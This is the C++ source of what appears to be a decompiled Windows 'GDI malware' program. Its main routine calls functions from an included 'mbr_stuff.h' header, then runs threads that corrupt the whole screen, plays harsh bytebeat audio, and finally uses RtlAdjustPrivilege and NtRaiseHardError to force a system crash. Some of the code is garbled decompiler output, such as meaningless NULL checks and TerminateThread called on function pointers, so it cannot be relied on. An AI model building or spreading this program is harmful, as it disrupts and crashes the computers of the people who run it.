#include <windows.h>
#include <time.h>
#include <cmath>

#include "mbr_stuff.h"
#include "waveout.h"
#include "waveout2.h"
#include "hTread.h"
#include "waveout3.h"
DWORD __fastcall StartAddress(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // rbp
    int v2; // esi
    int xSrc; // edi
    int v4; // er13
    int ySrc; // ebx
    HBRUSH v6; // r14
    int v7; // er12
    int v8; // er15
    int v9; // esi
    int v10; // eax
    int v11; // edi
    int v12; // ebx
    unsigned __int8 v13; // al
    int v14; // eax

    hdcSrc = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    xSrc = 0;
    v4 = GetSystemMetrics(1);
    ySrc = 0;
    v6 = CreateSolidBrush(0xFF00FFu);
    if (NULL != 1)
    {
        v7 = v2 - 1;
        v8 = v4 - 1;
        while (1)
        {
            SelectObject(hdcSrc, v6);
            StretchBlt(hdcSrc, xSrc + 5, ySrc + 5, 90, 90, hdcSrc, xSrc, ySrc, 100, 100, 0xAC000Eu);
            if (ySrc < v4)
                ySrc += 89;
            v9 = 0;
            v10 = xSrc + 89;
            if (ySrc <= v8)
                v10 = xSrc;
            if (ySrc <= v8)
                v9 = ySrc;
            xSrc = v10;
            if (v10 > v7)
            {
                v11 = (unsigned __int8)rand() << 8;
                v12 = v11 | ((unsigned __int8)rand() << 16);
                v13 = rand();
                v6 = CreateSolidBrush(v12 | (unsigned int)v13);
                v14 = rand();
                if (v14 % 100 + 1 == 22 * ((v14 % 100 + 1) / 22))
                    InvalidateRect(0i64, 0i64, 0);
                xSrc = 0;
            }
            if (NULL == 1)
                break;
            ySrc = v9;
        }
    }
    return GetThreadId(StartAddress);
}
DWORD __fastcall sub_140001B90(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // r13
    int v2; // er14
    int cy; // er12
    int v4; // eax
    int v5; // ebx
    HDC v6; // r15
    HBITMAP v7; // rax
    int y1; // edi
    int v9; // esi
    int v10; // ebx
    unsigned __int8 v11; // al
    HBRUSH v12; // rax
    int v13; // ebp
    float v14; // xmm1_4
    float v15; // xmm0_4
    int v16; // edi
    int v17; // ebx
    int v18; // eax
    __int64 v19; // rbx
    int v20; // eax
    HBITMAP v21; // rax
    int v23; // [rsp+D8h] [rbp+10h]
    int v24; // [rsp+E0h] [rbp+18h]
    int v25; // [rsp+E8h] [rbp+20h]

    hdcSrc = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    v25 = cy;
    v24 = rand() % v2;
    v4 = rand();
    v5 = v4 % cy;
    v23 = v4 % cy;
    v6 = CreateCompatibleDC(hdcSrc);
    v7 = CreateCompatibleBitmap(hdcSrc, v2, cy);
    SelectObject(v6, v7);
    BitBlt(v6, 0, 0, v2, cy, hdcSrc, 0, 0, 0xCC0020u);
    while (NULL != 1)
    {
        y1 = 0;
        if (cy > 0)
        {
            do
            {
                v9 = (unsigned __int8)rand() << 8;
                v10 = v9 | ((unsigned __int8)rand() << 16);
                v11 = rand();
                v12 = CreateSolidBrush(v10 | (unsigned int)v11);
                SelectObject(v6, v12);
                BitBlt(v6, 0, y1, v2, 80, hdcSrc, 0, y1, 0x5A0049u);
                if (NULL == 1)
                    break;
                y1 += 80;
            } while (y1 < cy);
            v5 = v23;
        }
        v13 = 4;
        if (v2 > 4)
        {
            do
            {
                v14 = cos((double)v13 + 1.666666666666667) * (double)v13 + 100.0;
                v15 = sin((double)v13 + 1.666666666666667) * (double)v13 + 100.0;
                v16 = v5 + (int)v15;
                v17 = v16 + rand() % 17 - 8;
                v18 = rand();
                BitBlt(hdcSrc, v24 + (int)v14, v16, 300, 300, v6, v24 + (int)v14 + v18 % 17 - 8, v17, 0xCC0020u);
                Sleep(0x3Bu);
                if (NULL == 1)
                    break;
                v5 = v23;
                ++v13;
            } while (v13 < v2);
            cy = v25;
        }
        v19 = 4i64;
        do
        {
            InvalidateRect(0i64, 0i64, 0);
            --v19;
        } while (v19);
        if (NULL == 1)
            break;
        v24 = rand() % v2;
        v20 = rand();
        v5 = v20 % cy;
        v23 = v20 % cy;
        v6 = CreateCompatibleDC(hdcSrc);
        v21 = CreateCompatibleBitmap(hdcSrc, v2, cy);
        SelectObject(v6, v21);
        BitBlt(v6, 0, 0, v2, cy, hdcSrc, 0, 0, 0xCC0020u);
    }
    return GetThreadId(sub_140001B90);
}
DWORD __fastcall sub_1400030E0(LPVOID lpThreadParameter)
{
    HDC v1; // r13
    int v2; // ebx
    __int64 v3; // rbp
    int v4; // edi
    int v5; // er14
    int v6; // er15
    int v7; // er12
    int v8; // eax
    int v9; // esi
    double v10; // xmm6_8
    HICON v11; // rdi
    float v12; // xmm1_4
    float v13; // xmm0_4
    int v15; // [rsp+98h] [rbp+10h]
    int v16; // [rsp+A0h] [rbp+18h]

    v1 = GetDC(0i64);
    v15 = GetSystemMetrics(0);
    v2 = v15;
    v3 = 32518i64;
    v4 = GetSystemMetrics(1);
    v16 = v4;
    if (NULL != 1)
    {
        v5 = v15 / 2;
        do
        {
            v6 = rand() % v2;
            v7 = rand() % v4;
            v8 = rand() % 4;
            if (v8)
            {
                if (v8 == 1)
                {
                    v3 = 32515i64;
                }
                else if (v8 == 3)
                {
                    v3 = 32516i64;
                }
            }
            else
            {
                v3 = 32513i64;
            }
            v9 = 0;
            if (v5 > 0)
            {
                do
                {
                    v10 = (double)(v9 + 300);
                    v11 = LoadIconW(0i64, (LPCWSTR)v3);
                    v12 = sin(v10) * (double)v9 + 100.0;
                    v13 = cos(v10) * (double)v9 + 100.0;
                    DrawIcon(v1, v6 + (int)v13, v7 + (int)v12, v11);
                    Sleep(0);
                    if (NULL == 1)
                        break;
                    v9 += 2;
                } while (v9 < v5);
                v2 = v15;
                v4 = v16;
            }
            InvalidateRect(0i64, 0i64, 0);
        } while (NULL != 1);
    }
    return GetThreadId(sub_1400030E0);
}
DWORD __fastcall sub_140001F60(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // rbp
    int v2; // er15
    int cy; // er12
    int v4; // er14
    int v5; // edi
    int v6; // ebx
    unsigned __int8 v7; // al
    HBRUSH v8; // rax
    int v9; // edi
    __int64 v10; // rsi
    double v11; // xmm6_8
    float v12; // xmm1_4
    float v13; // xmm0_4

    hdcSrc = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    v4 = v2 / 3;
    do
    {
        InvalidateRect(0i64, 0i64, 0);
        v5 = (unsigned __int8)rand() << 8;
        v6 = v5 | ((unsigned __int8)rand() << 16);
        v7 = rand();
        v8 = CreateSolidBrush(v6 | (unsigned int)v7);
        SelectObject(hdcSrc, v8);
        if (v4 > 4)
        {
            v9 = 12;
            v10 = (v4 - 5) / 3u + 1;
            do
            {
                v11 = (double)v9 / 180.0;
                v12 = cos(v11) * 100.0;
                v13 = sin(v11) * 100.0;
                BitBlt(hdcSrc, (int)v13, (int)v12, v2, cy, hdcSrc, 0, 0, 0xC000CAu);
                Sleep(0x1Du);
                v9 += 9;
                --v10;
            } while (v10);
        }
        InvalidateRect(0i64, 0i64, 0);
        InvalidateRect(0i64, 0i64, 0);
    } while (NULL != 1);
    return GetThreadId(sub_140001F60);
}
DWORD __fastcall sub_140002830(LPVOID lpThreadParameter)
{
    HDC v1; // r12
    int v2; // er15
    int v3; // eax
    int v4; // ecx
    int v5; // ebp
    double v6; // xmm12_8
    int i; // esi
    int j; // edi
    int v9; // eax
    double v10; // xmm8_8
    int v11; // eax
    double v12; // xmm7_8
    int v13; // ebx
    int v14; // eax
    int v15; // ebx
    int v16; // eax
    double v17; // xmm0_8
    int v18; // er13
    int v19; // eax
    int v20; // er14
    int v21; // er8
    int v22; // esi
    double v23; // xmm8_8
    double v24; // xmm6_8
    int v25; // edi
    double v26; // xmm0_8
    int v27; // esi
    int v28; // edi
    int v29; // eax
    double v30; // xmm7_8
    double v31; // xmm8_8
    double v32; // xmm8_8
    double v33; // xmm6_8
    double v34; // xmm6_8
    int k; // [rsp+D8h] [rbp+10h]

    v1 = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    v3 = GetSystemMetrics(1);
    v4 = NULL;
    v5 = v3;
    if (NULL != 1)
    {
        v6 = (double)v3;
        while (1)
        {
            for (i = 1; i < v2; ++i)
            {
                if (v4 == 1)
                    break;
                for (j = 1; j < v5; ++j)
                {
                    v9 = rand();
                    v10 = sin((double)(i + v9 % j));
                    v11 = rand();
                    v12 = cos((double)(i * (v11 % (j % v5)) / v2));
                    v13 = rand() % (int)(v2 + 0xFFu % j);
                    v14 = rand();
                    v15 = (unsigned __int8)(int)(float)((float)(int)(i % (unsigned int)j) - tanf((float)(v13 + i * (v14 % 3) + 1))) << 8;
                    v16 = rand();
                    v17 = ceil((double)(v16 % j) + v12 * v6 / (double)v2 - 1.0 + (double)v2);
                    SetPixel(v1, i, j, v15 | (unsigned __int8)(int)((double)(i * j) * v10) | ((unsigned __int8)(int)v17 << 16));
                    v4 = NULL;
                    if (NULL == 1)
                        break;
                }
            }
            v18 = rand() % 81 + 60;
            v19 = rand();
            v20 = 1;
            v4 = NULL;
            v21 = v19 % 81 + 60;
            for (k = v19 % 81 + 60; v20 < v2; ++v20)
            {
                if (v4 == 1)
                    break;
                v22 = 1;
                if (v5 > 1)
                {
                    v23 = (double)v21;
                    v24 = cos((double)(3 * v20)) * (double)v18;
                    do
                    {
                        v25 = (unsigned __int8)(int)(sin((double)(3 * v22)) * v23 + (double)v20) << 8;
                        v26 = tan((double)(3 * v20 * v22));
                        SetPixel(
                            v1,
                            v20,
                            v22,
                            (unsigned __int8)(int)((double)v22 + v24) | v25 | ((unsigned __int8)(int)(v26 * (double)v18
                                + (double)(v20 * v22)) << 16));
                        v4 = NULL;
                        if (NULL == 1)
                            break;
                        ++v22;
                    } while (v22 < v5);
                    v21 = k;
                }
            }
            v27 = 1;
            if (v2 > 1)
                break;
        LABEL_23:
            if (v4 == 1)
                return GetThreadId(sub_140002830);
        }
        while (v4 != 1)
        {
            v28 = 1;
            if (v5 > 1)
            {
                do
                {
                    v29 = rand();
                    v30 = cos((double)(3 * (v29 % v27)));
                    v31 = (double)(rand() % v2);
                    v32 = v31 * sin((double)(3 * v28));
                    v33 = (double)(rand() % (v27 * v28));
                    v34 = v33 + tan((double)(3 * v27 * v28)) * 100.0;
                    SetPixel(
                        v1,
                        v27,
                        v28,
                        ((unsigned __int8)(int)((double)v27 + v32) << 8) | (unsigned __int8)(int)((double)(int)(v27
                            / (unsigned int)v28)
                            * v30
                            + (double)v28) | ((unsigned __int8)(int)v34 << 16));
                    v4 = NULL;
                    if (NULL == 1)
                        return GetThreadId(sub_140002830);
                } while (++v28 < v5);
            }
            if (++v27 >= v2)
                goto LABEL_23;
        }
    }
    return GetThreadId(sub_140002830);
}
__int64 sub_140001700()
{
    unsigned int v0; // edx
    char* v1; // r8
    char v2; // al
    char v3; // cl
    HWAVEOUT phwo; // [rsp+30h] [rbp-D0h]
    struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h]
    WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h]
    char v8; // [rsp+80h] [rbp-80h]
    char v9; // [rsp+81h] [rbp-7Fh]

    *(DWORD*)&pwfx.wFormatTag = 65537;
    phwo = 0i64;
    pwfx.nSamplesPerSec = 8000;
    pwfx.nAvgBytesPerSec = 8000;
    *(DWORD*)&pwfx.nBlockAlign = 524289;
    pwfx.cbSize = 0;
    waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0i64, 0i64, 0);
    memset(&v9, 0, 0x4267Fui64);
    v0 = 0;
    v1 = &v8;
    do
    {
        ++v1;
        v2 = v0;
        v3 = v0 ^ (v0 >> 10) ^ ((v0 - 1280) >> 10) ^ (v0 + ((v0 >> 15) | 1));
        ++v0;
        *(v1 - 1) = v2 * v3;
    } while (v0 < 0x42680);
    pwh.lpData = &v8;
    *(WORD*)&pwh.dwBufferLength = 272000i64;
    pwh.dwUser = 0i64;
    *(WORD*)&pwh.dwFlags = 0i64;
    pwh.lpNext = 0i64;
    pwh.reserved = 0i64;
    waveOutPrepareHeader(phwo, &pwh, 0x30u);
    waveOutWrite(phwo, &pwh, 0x30u);
    waveOutUnprepareHeader(phwo, &pwh, 0x30u);
    waveOutClose(phwo);
    return 1i64;
}
DWORD __fastcall sub_140002660(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // rsi
    int v2; // ebx
    int v3; // ecx
    int v4; // ebp
    int v5; // edi
    HBRUSH v6; // rax
    double v7; // xmm7_8
    double v8; // xmm0_8

    hdcSrc = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    v3 = GetSystemMetrics(1);
    if (NULL != 1)
    {
        v4 = v3 / 2;
    LABEL_3:
        v5 = 3;
        while (1)
        {
            v6 = CreateSolidBrush(0xFF00u);
            SelectObject(hdcSrc, v6);
            v7 = cos((double)v5);
            v8 = sin((double)v5);
            BitBlt(
                hdcSrc,
                (int)(v7 * 100.0 + (double)(v2 / 2)),
                (int)(v8 * 100.0 + (double)v4),
                (int)(v7 * 119.0),
                (int)(v8 * 119.0),
                hdcSrc,
                (int)(v7 * 100.0 + (double)(v2 / 2)),
                (int)(v8 * 100.0 + (double)v4),
                0xC000CAu);
            Sleep(0xAu);
            if (NULL == 1)
                break;
            v5 += 3;
            if (v5 >= 360)
                goto LABEL_3;
        }
    }
    return GetThreadId(sub_140002660);
}
__int64 sub_140001060()
{
    HMODULE v0; // rax
    FARPROC v1; // rbx
    HMODULE v2; // rax
    FARPROC v3; // rax
    __int64 v4; // rdx
    void(__fastcall * v5)(WORD, WORD, WORD, WORD, DWORD, WORD); // rdi
    char v7; // [rsp+30h] [rbp-18h]
    char v8 = 0; // [rsp+34h] [rbp-14h]

    v0 = LoadLibraryA("ntdll.dll");
    v1 = GetProcAddress(v0, "RtlAdjustPrivilege");
    v2 = GetModuleHandleW(L"ntdll.dll");
    v3 = GetProcAddress(v2, "NtRaiseHardError");
    v4 = 1;
    v5 = (void(__fastcall*)(WORD, WORD, WORD, WORD, DWORD, WORD))v3;
    ((void(__fastcall*)(__int64, __int64, WORD, char*))v1)(19i64, v4, 0i64, &v7);
    v5(3221226164i64, 0i64, 0i64, 0i64, 6, (WORD)v8);
    return 1i64;
}
DWORD __fastcall sub_140002F20(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // r14
    int v2; // ebx
    int xSrc; // esi
    int v4; // edi
    int v5; // er13
    int v6; // er15
    HBRUSH v7; // r12
    int v8; // ebp
    int v9; // eax
    int v10; // edi
    int v11; // ebx
    unsigned __int8 v12; // al
    int v13; // eax
    int v15; // [rsp+98h] [rbp+10h]

    hdcSrc = GetDC(0i64);
    v2 = GetSystemMetrics(0) - 1;
    xSrc = 0;
    v4 = 0;
    v5 = GetSystemMetrics(1);
    v6 = v5 - 1;
    v15 = v2;
    v7 = CreateSolidBrush(0xFFFFu);
    do
    {
        SelectObject(hdcSrc, v7);
        StretchBlt(hdcSrc, xSrc - 5, v4 + 5, 90, 90, hdcSrc, xSrc, v4 - 5, 100, 100, 0xCE646Cu);
        if (v4 < v5)
            v4 += 89;
        v8 = 0;
        v9 = xSrc + 89;
        if (v4 <= v6)
            v9 = xSrc;
        if (v4 <= v6)
            v8 = v4;
        xSrc = v9;
        if (v9 > v2)
        {
            v10 = (unsigned __int8)rand() << 8;
            v11 = v10 | ((unsigned __int8)rand() << 16);
            v12 = rand();
            CreateSolidBrush(v11 | v12);
            v13 = rand();
            if (v13 % 100 + 1 == 22 * ((v13 % 100 + 1) / 22))
                InvalidateRect(0i64, 0i64, 0);
            v2 = v15;
            xSrc = 0;
        }
        v4 = v8;
    } while (NULL != 1);
    return GetThreadId(sub_140002F20);
}
__int64 __fastcall sub_140001580(HWAVEOUT phwo, struct wavehdr_tag* pwh, WAVEFORMATEX* pwfx)
{
    unsigned int v3; // ebx
    char* v4; // rdi
    unsigned int v5; // ecx
    HWAVEOUT hwo; // [rsp+30h] [rbp-D0h]
    struct wavehdr_tag v8; // [rsp+38h] [rbp-C8h]
    WAVEFORMATEX v9; // [rsp+68h] [rbp-98h]
    char v10; // [rsp+80h] [rbp-80h]

    *(DWORD*)&v9.wFormatTag = 65537;
    hwo = 0i64;
    v9.nSamplesPerSec = 11000;
    v9.nAvgBytesPerSec = 11000;
    *(DWORD*)&v9.nBlockAlign = 524289;
    v9.cbSize = 0;
    waveOutOpen(&hwo, 0xFFFFFFFF, &v9, 0i64, 0i64, 0);
    memset(&v10, 0, 0x33068ui64);
    v3 = 0;
    v4 = &v10;
    do
    {
        ++v4;
        v5 = v3++ * rand();
        *(v4 - 1) = v5 % 0x2AF8;
    } while (v3 < 0x33068);
    v8.lpData = &v10;
    *(WORD*)&v8.dwBufferLength = 209000i64;
    v8.dwUser = 0i64;
    *(WORD*)&v8.dwFlags = 0i64;
    v8.lpNext = 0i64;
    v8.reserved = 0i64;
    waveOutPrepareHeader(hwo, &v8, 0x30u);
    waveOutWrite(hwo, &v8, 0x30u);
    waveOutUnprepareHeader(hwo, &v8, 0x30u);
    waveOutClose(hwo);
    return 1i64;
}
DWORD __fastcall Thread(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // r15
    int v2; // er12
    COLORREF v3; // edi
    int x1; // esi
    int v5; // er13
    int v6; // er8
    HBRUSH v7; // rbx
    int y1; // ebp
    int cy; // er14
    int v10; // eax
    int v11; // eax
    COLORREF v13 = 0; // [rsp+88h] [rbp+10h]

    hdcSrc = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    v3 = v13;
    x1 = v13;
    v5 = GetSystemMetrics(1);
    do
    {
        v6 = rand() % 5;
        if (v6)
        {
            switch (v6)
            {
            case 1:
                v3 = 16711935;
                break;
            case 2:
                v3 = 0xFFFF;
                break;
            case 3:
                v3 = 65280;
                break;
            case 4:
                v3 = 16711680;
                break;
            }
        }
        else
        {
            v3 = 16776960;
        }
        v7 = CreateSolidBrush(v3);
        y1 = rand() % v5;
        cy = rand() % v5 / 4;
        SelectObject(hdcSrc, v7);
        v10 = rand() % 2;
        if (v10)
        {
            if (v10 == 1)
                x1 = -5;
        }
        else
        {
            x1 = 5;
        }
        BitBlt(hdcSrc, 0, y1, v2, cy, hdcSrc, x1, y1, 0x690041u);
        v11 = rand();
        Sleep(v11 % 159);
    } while (NULL != 1);
    return GetThreadId(Thread);
}
DWORD __fastcall sub_140002360(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // rdi
    int v2; // ebp
    int cy; // esi
    HDC v4; // rbx
    HBITMAP v5; // rax

    hdcSrc = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    do
    {
        v4 = CreateCompatibleDC(hdcSrc);
        v5 = CreateCompatibleBitmap(hdcSrc, v2, cy);
        SelectObject(v4, v5);
        BitBlt(v4, 0, 0, 200, cy, hdcSrc, v2 - 200, 0, 0xCC0020u);
        BitBlt(hdcSrc, 0, 0, v2, cy, hdcSrc, -200, 0, 0xCC0020u);
        BitBlt(hdcSrc, 0, 0, 200, cy, v4, 0, 0, 0xCC0020u);
        Sleep(0x3Bu);
    } while (0 != 1);
    return GetThreadId(sub_140002360);
}
DWORD __fastcall sub_1400024A0(LPVOID lpThreadParameter)
{
    HDC v1; // r13
    int v2; // ebx
    __int64 v3; // rbp
    int v4; // edi
    int v5; // er14
    int v6; // er15
    int v7; // er12
    int v8; // eax
    int v9; // esi
    double v10; // xmm6_8
    HICON v11; // rdi
    float v12; // xmm1_4
    float v13; // xmm0_4
    int v15; // [rsp+98h] [rbp+10h]
    int v16; // [rsp+A0h] [rbp+18h]

    v1 = GetDC(0i64);
    v15 = GetSystemMetrics(0);
    v2 = v15;
    v3 = 32518i64;
    v4 = GetSystemMetrics(1);
    v16 = v4;
    v5 = v15 / 2;
    do
    {
        v6 = rand() % v2;
        v7 = rand() % v4;
        v8 = rand() % 4;
        if (v8)
        {
            if (v8 == 1)
            {
                v3 = 32515i64;
            }
            else if (v8 == 3)
            {
                v3 = 32516i64;
            }
        }
        else
        {
            v3 = 32513i64;
        }
        v9 = 0;
        if (v5 > 0)
        {
            do
            {
                v10 = (double)(v9 + 300);
                v11 = LoadIconW(0i64, (LPCWSTR)v3);
                v12 = sin(v10) * (double)v9 + 100.0;
                v13 = tan(v10) * (double)v9 + 100.0;
                DrawIcon(v1, v6 + (int)v13, v7 + (int)v12, v11);
                Sleep(0);
                if (NULL == 1)
                    break;
                ++v9;
            } while (v9 < v5);
            v2 = v15;
            v4 = v16;
        }
        InvalidateRect(0i64, 0i64, 0);
    } while (NULL != 1);
    return GetThreadId(sub_1400024A0);
}
DWORD __fastcall sub_140002160(LPVOID lpThreadParameter)
{
    int v1; // ebx
    int v2; // er12
    __int64 v3; // rsi
    int v4; // er13
    int v5; // ebx
    int v6; // er14
    int v7; // er15
    int v8; // eax
    int v9; // ebp
    double v10; // xmm6_8
    HICON v11; // rdi
    float v12; // xmm1_4
    float v13; // xmm0_4
    int v15; // [rsp+20h] [rbp-78h]
    HDC hDC; // [rsp+28h] [rbp-70h]
    struct tagPOINT Point; // [rsp+30h] [rbp-68h]

    hDC = GetDC(0i64);
    v1 = GetSystemMetrics(0);
    GetSystemMetrics(1);
    v2 = 2 * GetSystemMetrics(11);
    v3 = 32518i64;
    v4 = 2 * GetSystemMetrics(12);
    v5 = 2 * v1;
    v15 = v5;
    do
    {
        GetCursorPos(&Point);
        v6 = Point.x - v2;
        v7 = Point.y - v4;
        v8 = rand() % 4;
        if (v8)
        {
            if (v8 == 1)
            {
                v3 = 32515i64;
            }
            else if (v8 == 3)
            {
                v3 = 32516i64;
            }
        }
        else
        {
            v3 = 32513i64;
        }
        v9 = 0;
        if (v5 > 0)
        {
            do
            {
                v10 = (double)(v9 + 300);
                v11 = LoadIconW(0i64, (LPCWSTR)v3);
                v12 = sin(v10) * (double)v9 + 100.0;
                v13 = tan(v10) * (double)v9 + 100.0;
                DrawIcon(hDC, v6 + (int)v13 - v2, v7 + (int)v12 - v4, v11);
                Sleep(0);
                v5 = v15;
                v9 += 2;
            } while (v9 < v15);
        }
        InvalidateRect(0i64, 0i64, 0);
    } while (NULL != 1);
    return GetThreadId(sub_140002160);
}
__int64 sub_140001A10()
{
    unsigned int v0; // er8
    char* v1; // r9
    char v2; // cl
    unsigned int v3; // eax
    HWAVEOUT phwo; // [rsp+30h] [rbp-D0h]
    struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h]
    WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h]
    char v8; // [rsp+80h] [rbp-80h]
    char v9; // [rsp+85h] [rbp-7Bh]

    *(DWORD*)&pwfx.wFormatTag = 65537;
    phwo = 0i64;
    pwfx.nSamplesPerSec = 8000;
    pwfx.nAvgBytesPerSec = 8000;
    *(DWORD*)&pwfx.nBlockAlign = 524289;
    pwfx.cbSize = 0;
    waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0i64, 0i64, 0);
    memset(&v8, 0, 0x30D40ui64);
    v0 = 5;
    v1 = &v9;
    do
    {
        ++v1;
        v2 = v0 * ((51864 >> ((v0 >> 9) & 0xE)) & 0xF);
        v3 = v0++ >> 8;
        *(v1 - 1) = v3 | v2;
    } while (v0 < 0x30D40);
    pwh.lpData = &v8;
    *(WORD*)&pwh.dwBufferLength = 200000i64;
    pwh.dwUser = 0i64;
    *(WORD*)&pwh.dwFlags = 0i64;
    pwh.lpNext = 0i64;
    pwh.reserved = 0i64;
    waveOutPrepareHeader(phwo, &pwh, 0x30u);
    waveOutWrite(phwo, &pwh, 0x30u);
    waveOutUnprepareHeader(phwo, &pwh, 0x30u);
    waveOutClose(phwo);
    return 1i64;
}
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    unsigned int v4; // eax
    DWORD v5; // eax
    DWORD v6; // eax
    DWORD v7; // eax
    __int64 v8; // rbx
    struct wavehdr_tag* v9 = 0; // rdx
    HWAVEOUT v10 = 0; // rcx
    WAVEFORMATEX* v11 = 0; // r8
    DWORD v12; // eax
    DWORD v13; // eax
    DWORD v14; // eax
    DWORD v15; // eax
    DWORD v16; // eax
    DWORD v17; // eax
    DWORD v18; // eax
    DWORD v19; // eax
    DWORD v20; // eax
    INT dword_140007670;
    INT dword_140007658;
    INT dword_14000764C;
    v4 = time(0);
    srand(v4);
    sub_140001110();
    Sleep(0x7148u);
    sub_1400011A0();
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)hThread, 0, 0, 0);
    Sleep(0x5208u);
    sub_140001300();
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_140002360, 0, 0, 0);
    Sleep(0x1B58u);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Thread, 0, 0, 0);
    Sleep(0x4650u);
    dword_140007670 = 1;
    dword_140007658 = 1;
    dword_14000764C = 1;
    v5 = GetThreadId(hThread);
    TerminateThread(hThread, v5);
    v6 = GetThreadId(Thread);
    TerminateThread(Thread, v6);
    v7 = GetThreadId(sub_140002360);
    TerminateThread(sub_140002360, v7);
    Sleep(0x7D0u);
    v8 = 36i64;
    do
    {
        InvalidateRect(0, 0, 0);
        --v8;
    } while (v8);
    sub_140001580(v10, v9, v11);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
    Sleep(0x251Cu);
    INT dword_14000765C = 1;
    v12 = GetThreadId(StartAddress);
    TerminateThread(StartAddress, v12);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_140002F20, 0, 0, 0);
    Sleep(0x251Cu);
    INT dword_140007650 = 1;
    v13 = GetThreadId(sub_140002F20);
    TerminateThread(sub_140002F20, v13);
    Sleep(0xC8u);
    sub_140001700();
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_140002830, 0, 0, 0);
    Sleep(0x4268u);
    INT  dword_140007660 = 1;
    v14 = GetThreadId(sub_140002830);
    TerminateThread(sub_140002830, v14);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_140001F60, 0, 0, 0);
    Sleep(0x4268u);
    INT dword_14000766C = 1;
    v15 = GetThreadId(sub_140001F60);
    TerminateThread(sub_140001F60, v15);
    INT sub_140001880();
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_1400024A0, 0, 0, 0);
    Sleep(0x2475u);
    INT dword_140007654 = 1;
    v16 = GetThreadId(sub_1400024A0);
    TerminateThread(sub_1400024A0, v16);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_140002160, 0, 0, 0);
    Sleep(0x2475u);
    INT  dword_140007668 = 1;
    v17 = GetThreadId(sub_140002160);
    TerminateThread(sub_140002160, v17);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_1400030E0, 0, 0, 0);
    Sleep(0x2475u);
    INT  dword_140007644 = 1;
    v18 = GetThreadId(sub_1400030E0);
    TerminateThread(sub_1400030E0, v18);
    sub_140001A10();
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_140001B90, 0, 0, 0);
    Sleep(0x30D4u);
    INT  dword_140007648 = 1;
    v19 = GetThreadId(sub_140001B90);
    TerminateThread(sub_140001B90, v19);
    Sleep(0x30D4u);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_140002660, 0, 0, 0);
    INT  dword_140007664 = 1;
    v20 = GetThreadId(sub_140002660);
    TerminateThread(sub_140002660, v20);
    Sleep(0xAu);
    sub_140001060();
    sub_140001060();
    ExitProcess(0);
}